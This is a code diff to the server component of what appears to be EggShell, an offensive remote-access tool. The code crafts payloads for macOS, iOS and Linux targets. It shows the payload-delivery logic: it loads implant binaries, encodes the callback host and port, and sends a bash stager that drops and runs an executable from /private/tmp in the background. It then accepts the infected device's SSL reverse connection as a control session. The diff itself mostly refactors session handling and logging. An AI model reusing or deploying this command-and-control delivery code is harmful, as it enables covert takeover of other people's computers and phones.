@@ -35,9 +35,9 @@ class Server:
 
 
     def get_modules(self,session):
-        if session.device == "i386": 
+        if session.type == "i386": 
             result = self.modules_macos
-        elif session.device == "arm64":
+        elif session.type == "arm64":
             result = self.modules_ios
         else:
             result = self.modules_python
@@ -85,14 +85,16 @@ class Server:
         MultiHandler(self)
 
 
-    def craft_payload(self,device):
+    def craft_payload(self,device,is_multi):
+        # TODO: Detect uid before we send executable
         if not self.host:
             raise ValueError('Server host not set')
         if not self.port:
             raise ValueError('Server port not set')
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":1}))
         if device == "i386":
-            h.info_general("Detected macOS")
+            if is_multi == False:
+                h.info_general("Detected macOS")
             f = open("resources/esplmacos", "rb")
             payload = f.read()
             f.close()
@@ -105,7 +107,8 @@ class Server:
             "/private/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         elif device == "arm64":
-            h.info_general("Detected iOS")
+            if is_multi == False:
+                h.info_general("Detected iOS")
             f = open("resources/esplios", "rb")
             payload = f.read()
             f.close()
@@ -118,7 +121,8 @@ class Server:
             return (instructions,payload)
         else:
             if "Linux" in device:
-                h.info_general("Detected Linux")
+                if is_multi == False:
+                    h.info_general("Detected Linux")
             elif "GET / HTTP/1.1" in device:
                 raise ValueError("EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file")
             else:
@@ -153,17 +157,19 @@ class Server:
         device_type = conn.recv(128).strip()
         
         try:
-            bash_stager, executable = self.craft_payload(device_type)
+            bash_stager, executable = self.craft_payload(device_type,is_multi)
         except Exception as e:
             h.info_error(str(e))
             raw_input("Press the enter key to continue")
             return
         
-        h.info_general("Sending Payload")
+        if is_multi == False:
+            h.info_general("Sending Payload")
         conn.send(bash_stager)
         conn.send(executable)
         conn.close()
-        h.info_general("Establishing Secure Connection...")
+        if is_multi == False:
+            h.info_general("Establishing Secure Connection...")
         return self.listen_for_executable_payload(s,device_type,is_multi)
 
 
@@ -176,11 +182,12 @@ class Server:
                                  certfile=".keys/server.crt",
                                  keyfile=".keys/server.key",
                                  ssl_version=ssl.PROTOCOL_SSLv23)
-        device_name = ssl_sock.recv(50)
+        device_info = json.loads(ssl_sock.recv(256))
+        device_info['type'] = device_type
 
-        if device_name:
-            name = h.UNDERLINE_GREEN + device_name + h.ENDC + h.GREEN + "> " + h.ENDC;
-            return session.Session(self,ssl_sock,name,device_type)
+        if 'name' in device_info and device_info['name'] != '':
+            device_info['name'] = h.UNDERLINE_GREEN + device_info['name'] + h.ENDC + h.GREEN + "> " + h.ENDC;
+            return session.Session(self,ssl_sock,device_info)
         elif is_multi:
             return None
         else:
